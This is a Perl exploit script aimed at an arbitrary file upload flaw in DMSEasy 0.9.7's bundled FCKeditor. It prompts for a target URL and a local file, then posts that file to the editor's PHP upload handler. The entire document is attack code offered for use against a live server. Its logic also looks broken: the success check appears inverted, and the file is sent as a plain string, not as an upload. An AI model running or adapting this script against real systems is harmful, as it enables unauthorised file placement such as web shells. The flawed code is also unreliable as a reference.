#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;
print <<INTRO;
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+   DMSEasy0.9.7 (fckeditor) Arbitrary File Upload  +
+                                                   +
+++++++++++++++++++++++++++++++++++++++++++++++++++++
INTRO
print "Enter URL(ie: http://target.com): ";
    chomp(my $url=<STDIN>);
  
print "Enter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);
my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/FCKeditor/editor/filemanager/upload/php/upload.php',
                      Content_Type => 'form-data',
                      Content      => [ NewFile => $file ] );
if($re->is_success) {
    if( index($re->content, "Disabled") != -1 ) { print "Exploit Successfull! File Uploaded!\n"; }
    else { print "File Upload Is Disabled! Failed!\n"; }
} else { print "HTTP Request Failed!\n"; }
exit;